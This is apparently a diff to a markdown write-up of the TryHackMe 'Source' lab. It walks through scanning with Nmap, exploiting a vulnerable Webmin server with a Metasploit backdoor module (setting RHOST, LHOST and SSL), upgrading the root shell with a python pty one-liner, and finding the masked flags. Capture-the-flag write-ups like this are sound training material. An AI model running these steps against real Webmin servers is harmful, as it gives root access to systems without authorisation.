@@ -9,7 +9,7 @@ Link to the room: <a href ='https://tryhackme.com/room/source'>https://tryhackme
 <br><br>
 <br>
 
-### Task 1: Enumeration 
+### Task 1: Scanning and Enumeration 
 
 Now, we are going to use <b>Nmap</b> for port enumeration and scanning.
 ```
@@ -38,6 +38,7 @@ According to the room description, Webmin is a web-based system configuration to
 </p>
 <br>
 
+### Task 2: Exploitation 
 When we try to access the web server using Firefox, it will give an error. Seems like the web server wants us to use SSL mode which is equivalent to HTTPS. So just change the URL to 𝗵𝘁𝘁𝗽𝘀://𝟭𝟬.𝟭𝟬.𝘅.𝘅:𝟭𝟬𝟬𝟬𝟬
 <br>
 
@@ -65,18 +66,20 @@ msfconsole
 <p align="center">
   <img width="80%" height="350" src="assets/source2.PNG">
 </p>
+<br>
 
 Search exploit modules related to WebMin
 <p align="center">
   <img width="80%" height="250" src="assets/source3.PNG">
 </p>
+<br> 
 
 You can use any module any module that you want, I will use the module that can create backdoor to the web server.
-<br>
 <br>
 <p align="center">
   <img width="80%" height="400" src="assets/source4.PNG">
 </p>
+<br>
 
 Now, we need to setup the payload ```RHOST```, ```LHOST``` and ```SSL``` (since the server uses SSL).
 
@@ -89,12 +92,16 @@ set LHOST your_ip_address
 ```
 set SSL true
 ```
+<br>
+
+### Task 3: Gaining access
 Execute the payload using ```run``` or ```exploit``` command.
 <p align="center">
   <img width="80%" height="200" src="assets/source7.PNG">
 </p>
-
+<br>
 As you can see, we get the root access. We can use python to create a stable shell.
+<br><br>
 
 ```
 shell
@@ -102,16 +109,20 @@ shell
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
+<br>
 <p align="center">
   <img width="80%" height="200" src="assets/source8.PNG">
 </p>
-
+<br>
 Usually user.txt will be in the home directory. So, I'm using find command to search the first flag 🚩.
+<br>
+<br>
 
 ```
 find -name user.txt
 ```
-🚩 user.txt
+🚩 user.txt 
+<br>
 THM{***********************}
 
 Now, change to root directory to find second flag 🚩.
@@ -119,6 +130,7 @@ Now, change to root directory to find second flag 🚩.
 find -name root.txt
 ```
 🚩 root.txt
+<br>
 THM{*******************}
 
 
